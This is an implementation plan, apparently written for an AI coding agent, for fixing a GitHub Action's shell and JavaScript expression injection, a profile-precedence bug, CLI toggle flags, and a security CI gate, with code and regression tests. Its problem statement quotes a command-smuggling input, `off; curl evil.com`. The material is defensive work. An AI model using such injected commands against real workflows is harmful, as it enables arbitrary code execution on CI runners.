# Critical Security Fixes Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Fix 4 critical Day 0–30 issues: action.yml shell injection, config_loader profile precedence, CLI toggle semantics, and add a quality-gate CI workflow.

**Architecture:** Four independent fixes to separate files/subsystems. Each task creates its own test file. No shared-file conflicts — tasks can run in parallel via subagents.

**Tech Stack:** Python 3.10+, argparse, PyYAML, GitHub Actions YAML, pytest

---

## Task 1: Fix action.yml Shell Injection (P0 — CRITICAL)

**Files:**
- Modify: `action.yml:484-500` (remove eval, use env vars)
- Modify: `action.yml:593-605,801` (fix JS expression injection)
- Create: `tests/test_action_yml_security.py`

**Problem:** Line 500 uses `eval $CMD` with unquoted `${{ inputs.* }}` values concatenated into the command string. An attacker passing `off; curl evil.com` as `deep-analysis-mode` gets arbitrary code execution. Lines 604-605 inject step outputs directly into JavaScript. Line 801 interpolates `inputs.review-type` into a JS template literal.

**Step 1: Replace eval+CMD pattern with direct execution using env vars**

Replace lines 483-500 in `action.yml`:

```yaml
      # BEFORE (vulnerable):
      #   CMD="python3 ... ${{ inputs.deep-analysis-mode }}"
      #   eval $CMD

      # Run audit directly — no eval, no string concatenation
      # All inputs are passed via environment variables (set in env: block above)
      python3 "$HOME/.argus/scripts/run_ai_audit.py" "$(pwd)" "$ARGUS_REVIEW_TYPE" \
        ${DEEP_ANALYSIS_ENABLED:+--deep-analysis-mode "$DEEP_ANALYSIS_MODE"} \
        ${DEEP_ANALYSIS_ENABLED:+--max-files-deep-analysis "$MAX_FILES_DEEP_ANALYSIS"} \
        ${DEEP_ANALYSIS_ENABLED:+--deep-analysis-cost-ceiling "$DEEP_ANALYSIS_COST_CEILING"} \
        ${DEEP_ANALYSIS_ENABLED:+--deep-analysis-timeout "$DEEP_ANALYSIS_TIMEOUT"} \
        ${BENCHMARK_ENABLED:+--benchmark}
```

Add these env vars to the `env:` block (around line 413):

```yaml
      ARGUS_REVIEW_TYPE: ${{ inputs.review-type }}
      DEEP_ANALYSIS_ENABLED: ${{ inputs.deep-analysis-mode != 'off' && 'true' || '' }}
      BENCHMARK_ENABLED: ${{ inputs.benchmark == 'true' && 'true' || '' }}
```

**Step 2: Fix JS expression injection on lines 604-605**

Replace direct `${{ }}` interpolation with env vars:

```yaml
      env:
        BLOCKER_COUNT: ${{ steps.code-review.outputs.blockers }}
        SUGGESTION_COUNT: ${{ steps.code-review.outputs.suggestions }}
      # ...
      const blockerCount = parseInt(process.env.BLOCKER_COUNT || '0', 10);
      const suggestionCount = parseInt(process.env.SUGGESTION_COUNT || '0', 10);
```

**Step 3: Fix JS template literal injection on line 801**

Replace `${{ inputs.review-type }}` with env var:

```yaml
      env:
        REVIEW_TYPE: ${{ inputs.review-type }}
      # ...
      `**Review Type:** ${process.env.REVIEW_TYPE}`,
```

**Step 4: Fix report path injection on line 503**

Replace:
```yaml
      REPORT_FILE=".argus/reviews/${ARGUS_REVIEW_TYPE}-report.md"
```
(Uses the env var instead of `${{ inputs.review-type }}`)

**Step 5: Write regression tests**

Create `tests/test_action_yml_security.py`:

```python
"""Regression tests for action.yml security — ensures no shell injection vectors."""

import re
from pathlib import Path

import pytest

ACTION_YML = Path(__file__).resolve().parents[1] / "action.yml"


@pytest.fixture(scope="module")
def action_content():
    return ACTION_YML.read_text(encoding="utf-8")


class TestNoEval:
    """Ensure eval is never used in action.yml."""

    def test_no_eval_in_run_blocks(self, action_content):
        # Find all `run:` block content (indented lines after run: |)
        run_blocks = re.findall(
            r"run:\s*\|\n((?:\s{4,}.*\n)*)", action_content
        )
        for i, block in enumerate(run_blocks):
            assert "eval " not in block, (
                f"run block #{i+1} contains 'eval' — "
                "use direct command execution instead"
            )
            assert "eval\t" not in block, (
                f"run block #{i+1} contains 'eval' — "
                "use direct command execution instead"
            )


class TestNoUnsafeInterpolation:
    """Ensure ${{ inputs.* }} is not used directly in shell run blocks."""

    SAFE_SHELL_PATTERN = re.compile(
        r'\$\{\{\s*inputs\.[^}]+\}\}',
    )

    def test_no_inputs_in_shell_run_blocks(self, action_content):
        """${{ inputs.* }} in run: blocks is unsafe — use env vars instead."""
        lines = action_content.splitlines()
        in_run_block = False
        violations = []
        for line_num, line in enumerate(lines, 1):
            stripped = line.strip()
            if stripped.startswith("run:"):
                in_run_block = True
                continue
            if in_run_block:
                # A line that's not indented enough exits the block
                if stripped and not line.startswith("        "):
                    if not stripped.startswith("#"):
                        in_run_block = False
                        continue
                if self.SAFE_SHELL_PATTERN.search(line):
                    violations.append(
                        f"  Line {line_num}: {line.strip()}"
                    )
        assert not violations, (
            "Found ${{ inputs.* }} in shell run: blocks (injection risk):\n"
            + "\n".join(violations)
            + "\n\nUse env: block variables instead."
        )


class TestNoUnsafeJSInterpolation:
    """Ensure step outputs are passed via env vars in JS blocks."""

    def test_no_direct_step_outputs_in_js(self, action_content):
        """${{ steps.*.outputs.* }} direct in JS is unsafe."""
        # Find script: | blocks
        script_blocks = re.findall(
            r"script:\s*\|\n((?:\s{4,}.*\n)*)", action_content
        )
        violations = []
        for i, block in enumerate(script_blocks):
            # Direct interpolation of steps outputs in arithmetic/assignment context
            matches = re.findall(
                r'(?:const|let|var)\s+\w+\s*=\s*\$\{\{',
                block,
            )
            if matches:
                violations.append(
                    f"script block #{i+1}: assigns ${{{{ }}}} directly to JS variable"
                )
        assert not violations, (
            "Found direct ${{ }} assignment in JS (injection risk):\n"
            + "\n".join(violations)
            + "\n\nUse env: vars and process.env.* instead."
        )
```

**Step 6: Run tests**

```bash
pytest tests/test_action_yml_security.py -v
```

Expected: All pass (after applying fixes).

---

## Task 2: Fix config_loader.py Profile Precedence Bug

**Files:**
- Modify: `scripts/config_loader.py:166-176,214-217,346-349`
- Create: `tests/test_config_loader.py`

**Problem:** `_profile_search_paths()` returns `[built-in, user, project-local]` but `_load_raw_profile()` breaks on first match (line 217). This means built-in profiles always win, contradicting the docstring that says "project-local overrides user overrides built-in." Users who create `~/.argus/profiles/standard.yml` get silently ignored.

**Step 1: Fix the search order — reverse the list so project-local is checked first**

In `_profile_search_paths()` (lines 166-176), reverse the return order:

```python
def _profile_search_paths(profile_name: str) -> List[Path]:
    """Return candidate YAML paths for *profile_name*, in priority order.

    First match wins, so higher-priority paths come first:
    project-local > user > built-in.
    """
    return [
        Path(".argus") / "profiles" / f"{profile_name}.yml",          # project-local (highest)
        Path.home() / ".argus" / "profiles" / f"{profile_name}.yml",  # user
        PROJECT_ROOT / "profiles" / f"{profile_name}.yml",            # built-in (lowest)
    ]
```

**Step 2: Update the docstrings that reference search order**

Update `load_profile()` docstring (lines 346-349):

```python
    """Load a profile by name and return a flat config dict.

    Search order (first match wins):
      1. ``.argus/profiles/{name}.yml``            (project-local, highest priority)
      2. ``~/.argus/profiles/{name}.yml``          (user)
      3. ``{PROJECT_ROOT}/profiles/{name}.yml``    (built-in, lowest priority)
    """
```

**Step 3: Write tests for profile precedence**

Create `tests/test_config_loader.py`:

```python
"""Tests for config_loader.py — profile precedence, env overrides, extends."""

import os
from pathlib import Path
from unittest.mock import patch

import pytest
import yaml

# Ensure scripts/ is importable
import sys

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))

import config_loader


class TestProfileSearchPaths:
    """_profile_search_paths returns paths in correct priority order."""

    def test_project_local_first(self):
        """Project-local should be index 0 (highest priority)."""
        paths = config_loader._profile_search_paths("standard")
        assert "project-local" or ".argus" in str(paths[0])
        # Built-in should be last
        assert "profiles" in str(paths[-1])
        # Check the order: project-local, user, built-in
        path_strs = [str(p) for p in paths]
        assert ".argus/profiles/standard.yml" in path_strs[0]

    def test_returns_three_paths(self):
        paths = config_loader._profile_search_paths("deep")
        assert len(paths) == 3


class TestProfilePrecedence:
    """Verify that project-local profiles override built-in profiles."""

    def test_project_local_overrides_builtin(self, tmp_path):
        """When both built-in and project-local exist, project-local wins."""
        # Create a fake project-local profile
        project_profile = tmp_path / ".argus" / "profiles" / "test-profile.yml"
        project_profile.parent.mkdir(parents=True)
        project_profile.write_text(
            yaml.dump({"scanners": {"semgrep": False}, "limits": {"max_files": 999}})
        )

        # Create a fake built-in profile
        builtin_profile = tmp_path / "builtin" / "profiles" / "test-profile.yml"
        builtin_profile.parent.mkdir(parents=True)
        builtin_profile.write_text(
            yaml.dump({"scanners": {"semgrep": True}, "limits": {"max_files": 50}})
        )

        # Mock search paths to use our temp dirs
        def mock_search_paths(name):
            return [
                tmp_path / ".argus" / "profiles" / f"{name}.yml",    # project-local
                tmp_path / "user" / "profiles" / f"{name}.yml",       # user (absent)
                tmp_path / "builtin" / "profiles" / f"{name}.yml",    # built-in
            ]

        with patch.object(config_loader, "_profile_search_paths", mock_search_paths):
            flat = config_loader.load_profile("test-profile")

        assert flat["enable_semgrep"] is False, "Project-local should override built-in"
        assert flat["max_files"] == 999

    def test_builtin_used_when_no_local(self, tmp_path):
        """When only built-in exists, it is loaded."""
        builtin_profile = tmp_path / "builtin" / "profiles" / "test-profile.yml"
        builtin_profile.parent.mkdir(parents=True)
        builtin_profile.write_text(
            yaml.dump({"scanners": {"semgrep": True}})
        )

        def mock_search_paths(name):
            return [
                tmp_path / ".argus" / "profiles" / f"{name}.yml",    # absent
                tmp_path / "user" / "profiles" / f"{name}.yml",       # absent
                tmp_path / "builtin" / "profiles" / f"{name}.yml",    # exists
            ]

        with patch.object(config_loader, "_profile_search_paths", mock_search_paths):
            flat = config_loader.load_profile("test-profile")

        assert flat["enable_semgrep"] is True


class TestExtendsInheritance:
    """Verify _extends merges parent then overlays child."""

    def test_child_overrides_parent(self, tmp_path):
        parent = tmp_path / "profiles" / "parent.yml"
        parent.parent.mkdir(parents=True)
        parent.write_text(yaml.dump({
            "scanners": {"semgrep": True, "trivy": True},
            "limits": {"max_files": 50},
        }))

        child = tmp_path / "profiles" / "child.yml"
        child.write_text(yaml.dump({
            "_extends": "parent",
            "scanners": {"semgrep": False},
            "limits": {"max_files": 200},
        }))

        def mock_search_paths(name):
            return [tmp_path / "profiles" / f"{name}.yml"]

        with patch.object(config_loader, "_profile_search_paths", mock_search_paths):
            flat = config_loader.load_profile("child")

        assert flat["enable_semgrep"] is False, "Child overrides parent"
        assert flat["enable_trivy"] is True, "Inherited from parent"
        assert flat["max_files"] == 200

    def test_circular_extends_raises(self, tmp_path):
        a = tmp_path / "profiles" / "a.yml"
        a.parent.mkdir(parents=True)
        a.write_text(yaml.dump({"_extends": "b"}))
        b = tmp_path / "profiles" / "b.yml"
        b.write_text(yaml.dump({"_extends": "a"}))

        def mock_search_paths(name):
            return [tmp_path / "profiles" / f"{name}.yml"]

        with patch.object(config_loader, "_profile_search_paths", mock_search_paths):
            with pytest.raises(ValueError, match="Circular"):
                config_loader.load_profile("a")


class TestEnvOverrides:
    """Environment variables override profile values."""

    def test_env_overrides_profile_value(self):
        with patch.dict(os.environ, {"MAX_FILES": "999"}, clear=False):
            overrides = config_loader.load_env_overrides()
        assert overrides["max_files"] == 999

    def test_bool_env_coercion(self):
        with patch.dict(os.environ, {"ENABLE_SEMGREP": "false"}, clear=False):
            overrides = config_loader.load_env_overrides()
        assert overrides["enable_semgrep"] is False

    def test_absent_env_not_in_overrides(self):
        env = {k: v for k, v in os.environ.items() if k != "ENABLE_TEMPORAL"}
        with patch.dict(os.environ, env, clear=True):
            overrides = config_loader.load_env_overrides()
        assert "enable_temporal" not in overrides


class TestBuildUnifiedConfig:
    """Full 5-layer merge works correctly."""

    def test_defaults_present(self):
        config = config_loader.build_unified_config()
        assert "enable_semgrep" in config
        assert "max_files" in config
        assert config["enable_semgrep"] is True

    def test_env_overrides_defaults(self):
        with patch.dict(os.environ, {"ENABLE_SEMGREP": "false"}, clear=False):
            config = config_loader.build_unified_config()
        assert config["enable_semgrep"] is False
```

**Step 4: Run tests**

```bash
PYTHONPATH=scripts pytest tests/test_config_loader.py -v
```

Expected: All pass.

---

## Task 3: Fix CLI Toggle Semantics

**Files:**
- Modify: `scripts/hybrid/cli.py:62-108,141-154,171-193`
- Create: `tests/test_hybrid_cli.py`

**Problem:** 17 flags use `store_true` + `default=True` — they're permanently stuck on. 5 of those bypass the env var layer entirely. There are no `--disable-*` flags. Users cannot disable any scanner from the CLI.

**Step 1: Replace all store_true+default=True with BooleanOptionalAction**

Python 3.9+ supports `argparse.BooleanOptionalAction`. This creates both `--enable-X` and `--no-enable-X` flags automatically. Use `default=None` so argparse doesn't shadow the env var layer.

Replace lines 62-108 with:

```python
    # Scanner toggles — use BooleanOptionalAction for --enable-X / --no-enable-X
    # default=None means "not specified on CLI" — env vars fill in the gap
    parser.add_argument("--enable-semgrep", action=argparse.BooleanOptionalAction, default=None, help="Enable Semgrep SAST")
    parser.add_argument("--enable-trivy", action=argparse.BooleanOptionalAction, default=None, help="Enable Trivy CVE scanning")
    parser.add_argument("--enable-checkov", action=argparse.BooleanOptionalAction, default=None, help="Enable Checkov IaC scanning")
    parser.add_argument("--enable-trufflehog", action=argparse.BooleanOptionalAction, default=None, help="Enable TruffleHog secret scanning")
    parser.add_argument("--enable-api-security", action=argparse.BooleanOptionalAction, default=None, help="Enable API Security scanning")
    parser.add_argument("--enable-dast", action=argparse.BooleanOptionalAction, default=None, help="Enable DAST scanning")
    parser.add_argument("--enable-supply-chain", action=argparse.BooleanOptionalAction, default=None, help="Enable Supply Chain Attack Detection")
    parser.add_argument("--enable-fuzzing", action=argparse.BooleanOptionalAction, default=None, help="Enable Intelligent Fuzzing Engine")
    parser.add_argument("--enable-threat-intel", action=argparse.BooleanOptionalAction, default=None, help="Enable Threat Intelligence Enrichment")
    parser.add_argument("--enable-remediation", action=argparse.BooleanOptionalAction, default=None, help="Enable Automated Remediation Engine")
    parser.add_argument("--enable-runtime-security", action=argparse.BooleanOptionalAction, default=None, help="Enable Container Runtime Security Monitoring")
    parser.add_argument("--enable-regression-testing", action=argparse.BooleanOptionalAction, default=None, help="Enable Security Regression Testing")
    parser.add_argument("--enable-ai-enrichment", action=argparse.BooleanOptionalAction, default=None, help="Enable AI enrichment with Claude/OpenAI")
    parser.add_argument("--enable-iris", action=argparse.BooleanOptionalAction, default=None, help="Enable IRIS semantic analysis")
    parser.add_argument("--enable-multi-agent", action=argparse.BooleanOptionalAction, default=None, help="Enable multi-agent persona review")
    parser.add_argument("--enable-spontaneous-discovery", action=argparse.BooleanOptionalAction, default=None, help="Enable spontaneous discovery")
    parser.add_argument("--enable-collaborative-reasoning", action=argparse.BooleanOptionalAction, default=None, help="Enable collaborative reasoning")
```

**Step 2: Unify the env var resolution — ALL flags go through get_bool_env**

Replace lines 141-154 with a single resolution function that uses config_loader defaults as the fallback:

```python
    # Resolve feature flags: CLI arg > env var > config_loader default
    # CLI args are None when not specified, so env var / default kicks in
    from config_loader import get_default_config

    _defaults = get_default_config()

    def _resolve_flag(cli_val, env_key, config_key):
        """CLI arg (if not None) > env var (if set) > config_loader default."""
        if cli_val is not None:
            return cli_val
        return get_bool_env(env_key, _defaults.get(config_key, False))

    enable_semgrep = _resolve_flag(args.enable_semgrep, "ENABLE_SEMGREP", "enable_semgrep")
    enable_trivy = _resolve_flag(args.enable_trivy, "ENABLE_TRIVY", "enable_trivy")
    enable_checkov = _resolve_flag(args.enable_checkov, "ENABLE_CHECKOV", "enable_checkov")
    enable_trufflehog = _resolve_flag(args.enable_trufflehog, "ENABLE_TRUFFLEHOG", "enable_trufflehog")
    enable_api_security = _resolve_flag(args.enable_api_security, "ENABLE_API_SECURITY", "enable_api_security")
    enable_dast = _resolve_flag(args.enable_dast, "ENABLE_DAST", "enable_dast")
    enable_supply_chain = _resolve_flag(args.enable_supply_chain, "ENABLE_SUPPLY_CHAIN", "enable_supply_chain")
    enable_fuzzing = _resolve_flag(args.enable_fuzzing, "ENABLE_FUZZING", "enable_fuzzing")
    enable_threat_intel = _resolve_flag(args.enable_threat_intel, "ENABLE_THREAT_INTEL", "enable_threat_intel")
    enable_remediation = _resolve_flag(args.enable_remediation, "ENABLE_REMEDIATION", "enable_remediation")
    enable_runtime_security = _resolve_flag(args.enable_runtime_security, "ENABLE_RUNTIME_SECURITY", "enable_runtime_security")
    enable_regression_testing = _resolve_flag(args.enable_regression_testing, "ENABLE_REGRESSION_TESTING", "enable_regression_testing")
    enable_ai_enrichment = _resolve_flag(args.enable_ai_enrichment, "ENABLE_AI_ENRICHMENT", "enable_ai_enrichment")
    enable_iris = _resolve_flag(args.enable_iris, "ENABLE_IRIS", "enable_iris")
    enable_multi_agent = _resolve_flag(args.enable_multi_agent, "ENABLE_MULTI_AGENT", "enable_multi_agent")
    enable_spontaneous_discovery = _resolve_flag(args.enable_spontaneous_discovery, "ENABLE_SPONTANEOUS_DISCOVERY", "enable_spontaneous_discovery")
    enable_collaborative_reasoning = _resolve_flag(args.enable_collaborative_reasoning, "ENABLE_COLLABORATIVE_REASONING", "enable_collaborative_reasoning")
```

**Step 3: Fix the analyzer constructor — ALL flags use resolved variables**

Replace lines 171-193 so every flag uses the resolved local variable (not `args.*` directly):

```python
    analyzer = HybridSecurityAnalyzer(
        enable_semgrep=enable_semgrep,
        enable_trufflehog=enable_trufflehog,
        enable_trivy=enable_trivy,
        enable_checkov=enable_checkov,
        enable_api_security=enable_api_security,
        enable_dast=enable_dast,
        enable_supply_chain=enable_supply_chain,
        enable_fuzzing=enable_fuzzing,
        enable_threat_intel=enable_threat_intel,
        enable_remediation=enable_remediation,
        enable_runtime_security=enable_runtime_security,
        enable_regression_testing=enable_regression_testing,
        enable_ai_enrichment=enable_ai_enrichment,
        enable_multi_agent=enable_multi_agent,
        enable_spontaneous_discovery=enable_spontaneous_discovery,
        enable_collaborative_reasoning=enable_collaborative_reasoning,
        enable_iris=enable_iris,
        ai_provider=args.ai_provider,
        dast_target_url=dast_target_url,
        fuzzing_duration=fuzzing_duration,
        runtime_monitoring_duration=runtime_monitoring_duration,
        config=config,
    )
```

**Step 4: Write CLI toggle tests**

Create `tests/test_hybrid_cli.py`:

```python
"""Tests for hybrid/cli.py — flag semantics, env var resolution, defaults."""

import argparse
import os
import sys
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))

from hybrid.cli import main, get_bool_env


class TestGetBoolEnv:
    def test_true_values(self):
        for val in ("true", "True", "TRUE", "1", "yes", "Yes"):
            with patch.dict(os.environ, {"TEST_FLAG": val}):
                assert get_bool_env("TEST_FLAG", False) is True

    def test_false_values(self):
        for val in ("false", "False", "0", "no", ""):
            with patch.dict(os.environ, {"TEST_FLAG": val}):
                assert get_bool_env("TEST_FLAG", True) is False

    def test_absent_returns_default(self):
        env = {k: v for k, v in os.environ.items() if k != "TEST_FLAG"}
        with patch.dict(os.environ, env, clear=True):
            assert get_bool_env("TEST_FLAG", True) is True
            assert get_bool_env("TEST_FLAG", False) is False


class TestCLIFlagSemantics:
    """Verify --enable-X and --no-enable-X both work."""

    @pytest.fixture
    def parser(self):
        """Build the parser without running main()."""
        p = argparse.ArgumentParser()
        p.add_argument("target")
        p.add_argument("--enable-semgrep", action=argparse.BooleanOptionalAction, default=None)
        p.add_argument("--enable-dast", action=argparse.BooleanOptionalAction, default=None)
        p.add_argument("--enable-fuzzing", action=argparse.BooleanOptionalAction, default=None)
        return p

    def test_enable_flag_sets_true(self, parser):
        args = parser.parse_args([".", "--enable-semgrep"])
        assert args.enable_semgrep is True

    def test_no_enable_flag_sets_false(self, parser):
        args = parser.parse_args([".", "--no-enable-semgrep"])
        assert args.enable_semgrep is False

    def test_absent_flag_is_none(self, parser):
        args = parser.parse_args(["."])
        assert args.enable_semgrep is None

    def test_disable_overrides_enable(self, parser):
        """Last flag wins in argparse."""
        args = parser.parse_args([".", "--enable-dast", "--no-enable-dast"])
        assert args.enable_dast is False


class TestFlagResolution:
    """Verify: CLI > env var > config_loader default."""

    def test_cli_true_overrides_env_false(self):
        """Explicit --enable-X on CLI beats ENABLE_X=false env var."""
        cli_val = True
        with patch.dict(os.environ, {"ENABLE_SEMGREP": "false"}):
            # CLI is not None, so it wins
            result = cli_val if cli_val is not None else get_bool_env("ENABLE_SEMGREP", True)
        assert result is True

    def test_cli_false_overrides_env_true(self):
        """Explicit --no-enable-X on CLI beats ENABLE_X=true env var."""
        cli_val = False
        with patch.dict(os.environ, {"ENABLE_SEMGREP": "true"}):
            result = cli_val if cli_val is not None else get_bool_env("ENABLE_SEMGREP", True)
        assert result is False

    def test_absent_cli_falls_to_env(self):
        """No CLI flag -> env var decides."""
        cli_val = None
        with patch.dict(os.environ, {"ENABLE_DAST": "true"}):
            result = cli_val if cli_val is not None else get_bool_env("ENABLE_DAST", False)
        assert result is True

    def test_absent_cli_and_env_falls_to_default(self):
        """No CLI, no env var -> config_loader default."""
        cli_val = None
        env = {k: v for k, v in os.environ.items() if k != "ENABLE_DAST"}
        with patch.dict(os.environ, env, clear=True):
            result = cli_val if cli_val is not None else get_bool_env("ENABLE_DAST", False)
        assert result is False


class TestDefaultAlignment:
    """CLI defaults should match config_loader defaults for expensive features."""

    def test_dast_defaults_off(self):
        """DAST should default to off (needs target URL, expensive)."""
        from config_loader import get_default_config
        defaults = get_default_config()
        assert defaults["enable_dast"] is False

    def test_fuzzing_defaults_off(self):
        from config_loader import get_default_config
        defaults = get_default_config()
        assert defaults["enable_fuzzing"] is False

    def test_runtime_security_defaults_off(self):
        from config_loader import get_default_config
        defaults = get_default_config()
        assert defaults["enable_runtime_security"] is False

    def test_collaborative_reasoning_defaults_off(self):
        from config_loader import get_default_config
        defaults = get_default_config()
        assert defaults["enable_collaborative_reasoning"] is False
```

**Step 5: Run tests**

```bash
PYTHONPATH=scripts pytest tests/test_hybrid_cli.py -v
```

Expected: All pass.

---

## Task 4: Add Quality Gate CI Workflow

**Files:**
- Create: `.github/workflows/quality-gate.yml`
- Create: `tests/test_workflow_security.py`

**Problem:** No CI job catches regressions in workflow security (eval re-introduced, unsafe shell patterns added back). Need a gate that fails the build.

**Step 1: Create quality-gate workflow**

Create `.github/workflows/quality-gate.yml`:

```yaml
name: Quality Gate

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

permissions:
  contents: read

jobs:
  workflow-security:
    name: Workflow Security Checks
    runs-on: ubuntu-latest
    timeout-minutes: 5

    steps:
      - name: Checkout code
        uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332  # v4.1.7

      - name: Set up Python
        uses: actions/setup-python@e797f83bcb11b83ae66e0230d6156d7c80228e7c  # v6.0.0
        with:
          python-version: '3.11'
          cache: 'pip'

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install pytest pyyaml

      - name: Run workflow security tests
        run: |
          pytest tests/test_action_yml_security.py tests/test_workflow_security.py -v

  config-integrity:
    name: Configuration Integrity
    runs-on: ubuntu-latest
    timeout-minutes: 5

    steps:
      - name: Checkout code
        uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332  # v4.1.7

      - name: Set up Python
        uses: actions/setup-python@e797f83bcb11b83ae66e0230d6156d7c80228e7c  # v6.0.0
        with:
          python-version: '3.11'
          cache: 'pip'

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install pytest pyyaml

      - name: Run config + CLI tests
        run: |
          PYTHONPATH=scripts pytest tests/test_config_loader.py tests/test_hybrid_cli.py -v
```

**Step 2: Create workflow security regression tests**

Create `tests/test_workflow_security.py`:

```python
"""Regression tests for all GitHub Actions workflow files."""

import re
from pathlib import Path

import pytest
import yaml

WORKFLOWS_DIR = Path(__file__).resolve().parents[1] / ".github" / "workflows"


@pytest.fixture(scope="module")
def workflow_files():
    return list(WORKFLOWS_DIR.glob("*.yml"))


class TestNoUnsafeShellPatterns:
    """Ensure no workflow uses dangerous shell patterns."""

    DANGEROUS_PATTERNS = [
        (r'\beval\s', "eval command found"),
        (r'\beval\t', "eval command found"),
    ]

    def test_no_eval_in_workflows(self, workflow_files):
        violations = []
        for wf in workflow_files:
            content = wf.read_text()
            # Only check inside run: blocks
            run_blocks = re.findall(r"run:\s*\|\n((?:\s+.*\n)*)", content)
            for block in run_blocks:
                for pattern, msg in self.DANGEROUS_PATTERNS:
                    if re.search(pattern, block):
                        violations.append(f"{wf.name}: {msg}")
                        break
        assert not violations, (
            "Unsafe shell patterns in workflows:\n" + "\n".join(violations)
        )


class TestWorkflowPermissions:
    """All workflows should declare minimal permissions."""

    def test_permissions_declared(self, workflow_files):
        missing = []
        for wf in workflow_files:
            content = yaml.safe_load(wf.read_text())
            if content and "permissions" not in content:
                missing.append(wf.name)
        # Warn but don't fail — some workflows legitimately need broader perms
        if missing:
            pytest.skip(f"Advisory: {len(missing)} workflows lack top-level permissions")


class TestPinnedActions:
    """External actions should be pinned by SHA, not tag."""

    TAG_PATTERN = re.compile(r"uses:\s+[\w-]+/[\w-]+@v\d")

    def test_no_tag_only_pinning(self, workflow_files):
        violations = []
        for wf in workflow_files:
            for line_num, line in enumerate(wf.read_text().splitlines(), 1):
                if self.TAG_PATTERN.search(line):
                    # Allow if there's a SHA comment on the same line
                    if "#" not in line:
                        violations.append(f"{wf.name}:{line_num}: {line.strip()}")
        if violations:
            pytest.skip(
                f"Advisory: {len(violations)} actions pinned by tag only:\n"
                + "\n".join(violations[:5])
            )
```

**Step 3: Run all tests**

```bash
PYTHONPATH=scripts pytest tests/test_action_yml_security.py tests/test_workflow_security.py tests/test_config_loader.py tests/test_hybrid_cli.py -v
```

Expected: All pass.

---

## Parallel Execution Plan

These 4 tasks are independent (different files, no shared state):

| Agent | Task | Files Modified | Test File |
|-------|------|---------------|-----------|
| Agent 1 | action.yml shell injection | `action.yml` | `tests/test_action_yml_security.py` |
| Agent 2 | config_loader precedence | `scripts/config_loader.py` | `tests/test_config_loader.py` |
| Agent 3 | CLI toggle semantics | `scripts/hybrid/cli.py` | `tests/test_hybrid_cli.py` |
| Agent 4 | Quality gate CI | `.github/workflows/quality-gate.yml` | `tests/test_workflow_security.py` |

After all 4 agents complete, coordinator runs full test suite and commits.
